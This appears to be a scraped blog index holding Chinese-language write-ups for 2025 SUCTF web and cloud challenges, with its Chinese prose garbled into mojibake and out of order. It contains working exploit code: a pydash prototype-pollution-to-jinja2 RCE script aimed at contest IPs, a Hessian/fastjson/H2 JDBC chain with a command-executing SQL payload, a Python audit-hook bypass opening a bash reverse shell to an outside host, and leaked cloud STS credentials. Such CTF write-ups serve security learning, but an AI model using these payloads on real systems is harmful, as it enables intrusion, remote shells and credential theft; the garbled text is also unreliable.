http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 å‹é“¾åç§°2 å‹é“¾æè¿°2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"å‹é“¾"},{"categories":null,"contents":"ä¸€åå¤§äºŒåœ¨è¯»å­¦ç”Ÿ\nSyclover \u0026amp; 0XFFF æˆå‘˜\nå¯¹å„ç§å®‰å…¨æ„Ÿå…´è¶£ï¼Œç›®å‰ä¸»è¦å­¦ä¹ çš„è¿˜çš„æ˜¯Webå®‰å…¨ï¼ˆJava å®‰å…¨ã€äº‘å®‰å…¨ç­‰ï¼‰\næœ€çˆ±åƒï¼Œæœ€å–œæ¬¢åƒçš„æ˜¯ğŸ‰ï¼Œæœ€å–œæ¬¢å¹²çš„äº‹æƒ…å°±æ˜¯å¤§å¤å¤©æŠ±ç€åŠä¸ªè¥¿ç“œæ‹¿å‹ºå­æŒ–ç€åƒç„¶åçœ‹è§†é¢‘\nä¼šæ‰“ç‚¹å°æ¸¸æˆï¼ˆå…¶å®ä»å°å­¦ä¹‹å‰å°±å¼€å§‹æ‰“æ¸¸æˆäº†hh\nä»€ä¹ˆéƒ½æƒ³å­¦ï¼Œä½†ä»€ä¹ˆéƒ½ä¸ä¼š\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 